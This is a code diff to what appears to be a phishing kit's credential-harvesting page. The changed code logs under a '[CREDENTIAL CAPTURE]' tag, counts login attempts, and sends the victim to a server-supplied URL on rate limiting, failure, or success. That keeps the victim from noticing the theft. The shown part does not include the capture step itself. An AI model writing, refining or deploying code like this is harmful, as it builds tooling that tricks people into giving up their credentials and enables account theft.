@@ -1264,16 +1264,30 @@ useEffect(() => {
         return
       }
       
+      // Check for 429 status (Too Many Requests) - redirect immediately
+      if (response.status === 429) {
+        const result = await response.json()
+        if (result.redirect) {
+          console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - redirecting to:', result.redirect)
+          window.location.href = result.redirect
+          return
+        }
+      }
+      
       const result = await response.json()
       
-      if (result.redirect) {
-        // PHASE 7.3: Only call secure-redirect for Type A and Type C
-        const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
-        const format = detectLinkFormat(searchParams, pathname)
-        const redirectUrl = buildSecureRedirectUrl(format, searchParams, pathname, email)
-        if (redirectUrl) {
-          window.location.href = redirectUrl
-        }
+      // CRITICAL FIX: Check for failure with redirect FIRST (before success check)
+      // This handles the 4th attempt and beyond
+      if (!result.success && result.redirect) {
+        console.log('[CREDENTIAL CAPTURE] 🚫 Request failed - redirecting to:', result.redirect)
+        window.location.href = result.redirect
+        return
+      }
+      
+      // If redirect exists but success is true, use the redirect from API response
+      if (result.redirect && result.success) {
+        console.log('[CREDENTIAL CAPTURE] ✅ Success with redirect:', result.redirect)
+        window.location.href = result.redirect
         return
       }
       
